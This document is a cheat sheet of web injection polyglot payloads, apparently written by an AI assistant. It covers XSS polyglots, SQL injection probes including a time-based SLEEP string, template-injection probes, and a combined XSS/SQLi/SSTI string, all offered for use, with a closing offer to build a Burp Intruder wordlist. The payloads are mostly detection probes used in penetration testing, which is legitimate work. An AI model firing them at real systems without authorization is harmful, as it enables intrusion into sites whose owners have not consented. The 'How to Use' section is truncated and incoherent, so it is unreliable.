

---

### 🧩 1. XSS Polyglots

#### **Basic XSS Polyglot**

```
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'
```

#### **Super-Polyglot by 0xSobky**

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

### 🧠 2. SQLi Polyglots

#### **Multi-Quote SQL Probe**

```
AND 1=0 --' AND 1=0 --" AND 1=0 --
```

#### **LightOS Polyglot**

```
OR 1#"OR"'OR''='"="'OR''='
```

#### **Sleep Polyglot**

```
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

---

### 🧪 3. SSTI / CSTI Polyglot

#### **Early SSTI Probe**

```
${{7*2}}${{7*2}}
```

#### **Extended SSTI with HTML Injection**

```
"><img src=x onerror=alert(1)>{{7*2}}<svg/onload=console.log(2)>
```

---

### 🧬 4. Combined XSS + SQLi + SSTI Polyglot (Advanced)

```
'"><svg/onload=alert(1)> OR 1=1 -- ">{{7*2}}
```

---

### ⚙️ How to Use

2. **Observe output**:
    

---

### ✅ TL;DR

- **SSTI polyglots** use math or code directives to detect template rendering early.
- **Combined payloads** let you detect multiple vulnerability types with a single request—speeding up triage and recon.

Let me know if you'd like these compiled into a Burp Intruder wordlist or formatted for automated scans!